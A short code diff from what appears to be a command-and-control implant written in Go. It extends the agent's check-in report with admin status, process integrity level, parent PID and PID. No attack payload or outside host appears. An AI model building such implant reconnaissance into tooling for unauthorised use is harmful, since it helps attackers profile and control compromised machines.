@@ -65,14 +65,21 @@ func (a *Agent) checkin() error {
 	}
 
 	sysInfo := commands.GetSystemInfo()
+	isAdmin := commands.IsAdmin()
+	integrity := commands.GetProcessIntegrityLevel()
+	ppid := commands.GetPPID()
 
 	checkinData := map[string]interface{}{
-		"id":       a.id,
-		"hostname": hostname,
-		"username": username,
-		"os":       runtime.GOOS,
-		"arch":     runtime.GOARCH,
-		"sysinfo":  sysInfo,
+		"id":        a.id,
+		"hostname":  hostname,
+		"username":  username,
+		"os":        runtime.GOOS,
+		"arch":      runtime.GOARCH,
+		"sysinfo":   sysInfo,
+		"is_admin":  isAdmin,
+		"integrity": integrity,
+		"ppid":      ppid,
+		"pid":       os.Getpid(),
 	}
 
 	data, _ := json.Marshal(checkinData)
